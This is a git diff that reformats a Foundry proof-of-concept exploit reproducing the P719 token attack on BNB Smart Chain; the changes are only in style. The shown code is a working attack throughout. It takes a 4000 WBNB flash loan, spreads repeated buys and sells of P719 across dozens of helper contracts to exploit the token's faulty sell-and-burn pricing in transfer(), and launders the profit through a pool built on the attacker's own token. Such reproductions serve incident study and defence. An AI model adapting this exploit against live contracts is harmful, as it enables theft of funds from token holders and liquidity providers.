@@ -11,10 +11,10 @@ import "../interface.sol";
 // Attack Tx : https://bscscan.com/tx/0x9afcac8e82180fa5b2f346ca66cf6eb343cd1da5a2cd1b5117eb7eaaebe953b3
 // @Info
 // Vulnerable Contract Code : https://bscscan.com/token/0x6beee2b57b064eac5f432fc19009e3e78734eabc#code
-// Not verified contract but the bug lies in `transfer()` function, when tokens are transferred to P719, 
-// the action is processed as a sell, using a Uniswap-like swap mechanism to calculate the BNB amount to 
+// Not verified contract but the bug lies in `transfer()` function, when tokens are transferred to P719,
+// the action is processed as a sell, using a Uniswap-like swap mechanism to calculate the BNB amount to
 // be swapped.
-// After the swap, P719 burns the majority of sold tokens and transfers fee tokens from itself, which could 
+// After the swap, P719 burns the majority of sold tokens and transfers fee tokens from itself, which could
 // wrongly inflates the token's price.
 // More info: https://x.com/TenArmorAlert/status/1844929489823989953
 
@@ -32,7 +32,7 @@ contract P719Token_exp is Test {
     MyToken myToken;
 
     function setUp() public {
-        vm.createSelectFork("bsc", 43023423 - 1);
+        vm.createSelectFork("bsc", 43_023_423 - 1);
     }
 
     function testPoC() public {
@@ -46,13 +46,8 @@ contract P719Token_exp is Test {
         // Second create a pair in uniswap with WBNB
         vm.deal(attacker, 0.001 ether);
         myToken.approve(PancakeRouter, type(uint256).max);
-        (,,uint256 liquidity) = IFS(PancakeRouter).addLiquidityETH{value: 0.001 ether}(
-            address(myToken),
-            100 ether,
-            100 ether,
-            0.001 ether,
-            attacker,
-            block.timestamp
+        (,, uint256 liquidity) = IFS(PancakeRouter).addLiquidityETH{value: 0.001 ether}(
+            address(myToken), 100 ether, 100 ether, 0.001 ether, attacker, block.timestamp
         );
 
         // Third create severals buy/sell contract to attack P719 contract
@@ -66,15 +61,10 @@ contract P719Token_exp is Test {
         address myPair = IFS(factory).getPair(weth, address(myToken));
         IERC20(myPair).approve(PancakeRouter, type(uint256).max);
         IFS(PancakeRouter).removeLiquidityETH(
-            address(myToken),
-            liquidity,
-            0,
-            547180977558295682131,
-            attacker,
-            block.timestamp
+            address(myToken), liquidity, 0, 547_180_977_558_295_682_131, attacker, block.timestamp
         );
 
-        console.log('Final balance in WETH:', attacker.balance);
+        console.log("Final balance in WETH:", attacker.balance);
     }
 }
 
@@ -84,7 +74,9 @@ contract AttackerC {
     AttackerC2[] attackerC2s33;
     AttackerC2[] attackerC2s100;
 
-    function setup(address _myToken) external {
+    function setup(
+        address _myToken
+    ) external {
         myToken = _myToken;
 
         for (uint256 i; i < 33; i++) {
@@ -97,18 +89,11 @@ contract AttackerC {
 
     function attack() external {
         IFS(PancakeV3Pool).flash(
-            address(this),
-            0,
-            4000 ether,
-            hex'0000000000000000000000000000000000000000000000000000000000000001'
+            address(this), 0, 4000 ether, hex"0000000000000000000000000000000000000000000000000000000000000001"
         );
     }
 
-    function pancakeV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes calldata data
-    ) external {
+    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
         IFS(weth).withdraw(4000 ether);
         //uint256 supply = IERC20(P719).totalSupply();
 
@@ -130,21 +115,15 @@ contract AttackerC {
 
         for (uint256 i; i < attackerC2s33.length; i++) {
             IERC20(P719).transferFrom(
-                address(attackerC2s33[i]),
-                address(attC2),
-                IERC20(P719).balanceOf(address(attackerC2s33[i]))
+                address(attackerC2s33[i]), address(attC2), IERC20(P719).balanceOf(address(attackerC2s33[i]))
             );
-        }        
-                
+        }
+
         //IERC20(P719).approve(msg.sender, type(uint256).max);
         uint256 balAttC4 = IERC20(P719).balanceOf(address(attC2));
 
         for (uint256 i; i < attackerC2s100.length; i++) {
-            IERC20(P719).transferFrom(
-                address(attC2),
-                address(attackerC2s100[i]),
-                balAttC4 / 100
-            );
+            IERC20(P719).transferFrom(address(attC2), address(attackerC2s100[i]), balAttC4 / 100);
             attackerC2s100[i].sell(balAttC4 / 100);
         }
 
@@ -152,7 +131,7 @@ contract AttackerC {
         IFS(weth).deposit{value: address(this).balance}();
 
         uint256 bal3 = IERC20(weth).balanceOf(address(this));
-        
+
         IERC20(weth).approve(PancakeRouter, type(uint256).max);
         //IERC20(myToken).approve(PancakeRouter, type(uint256).max);
 
@@ -161,17 +140,13 @@ contract AttackerC {
         path[1] = myToken;
 
         IFS(PancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            bal3 - 4000 ether - fee1,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            bal3 - 4000 ether - fee1, 0, path, address(this), block.timestamp
         );
 
         IERC20(weth).transfer(PancakeV3Pool, 4000 ether + fee1);
     }
 
-    receive() external payable{}
+    receive() external payable {}
 }
 
 contract AttackerC2 {
@@ -180,22 +155,24 @@ contract AttackerC2 {
     }
 
     function buy() external payable {
-        P719.call{value: msg.value}('');
-    }
-    
-    // Used by attackerC2s33 and attackerC2s100contracts
-    function sell(uint256 amount) external {
-        IERC20(P719).transfer(P719, amount);
-        msg.sender.call{value: address(this).balance}('');
+        P719.call{value: msg.value}("");
     }
 
     // Used by attackerC2s33 and attackerC2s100contracts
-    receive() external payable{}
+    function sell(
+        uint256 amount
+    ) external {
+        IERC20(P719).transfer(P719, amount);
+        msg.sender.call{value: address(this).balance}("");
+    }
+
+    // Used by attackerC2s33 and attackerC2s100contracts
+    receive() external payable {}
 }
 
 contract MyToken {
-    constructor () {
-        balanceOf[msg.sender] += 10000000000000000 ether;
+    constructor() {
+        balanceOf[msg.sender] += 10_000_000_000_000_000 ether;
     }
 
     mapping(address => uint256) public balanceOf;
@@ -210,15 +187,11 @@ contract MyToken {
     function transfer(address to, uint256 amount) public virtual returns (bool) {
         balanceOf[msg.sender] -= amount;
         balanceOf[to] += amount;
-     
+
         return true;
     }
 
-    function transferFrom(
-        address from,
-        address to,
-        uint256 amount
-    ) public virtual returns (bool) {
+    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
         uint256 allowed = allowance[from][msg.sender];
         if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
 
@@ -231,43 +204,40 @@ contract MyToken {
 
 interface IFS {
     // PancakeV3Pool
-    function flash(
-        address recipient,
-        uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
-    ) external;
+    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
 
     // WETH
-    function withdraw(uint256) external;
+    function withdraw(
+        uint256
+    ) external;
     function deposit() external payable;
 
     // PancakeRouter
     function factory() external view returns (address);
 
     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
-        uint amountIn,
-        uint amountOutMin,
+        uint256 amountIn,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
-        uint deadline
+        uint256 deadline
     ) external;
     function addLiquidityETH(
         address token,
-        uint amountTokenDesired,
-        uint amountTokenMin,
-        uint amountETHMin,
+        uint256 amountTokenDesired,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
         address to,
-        uint deadline
-    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+        uint256 deadline
+    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
     function removeLiquidityETH(
         address token,
-        uint liquidity,
-        uint amountTokenMin,
-        uint amountETHMin,
+        uint256 liquidity,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
         address to,
-        uint deadline
-    ) external returns (uint amountToken, uint amountETH);
+        uint256 deadline
+    ) external returns (uint256 amountToken, uint256 amountETH);
 
     // PancakeFactory
     function getPair(address tokenA, address tokenB) external view returns (address pair);
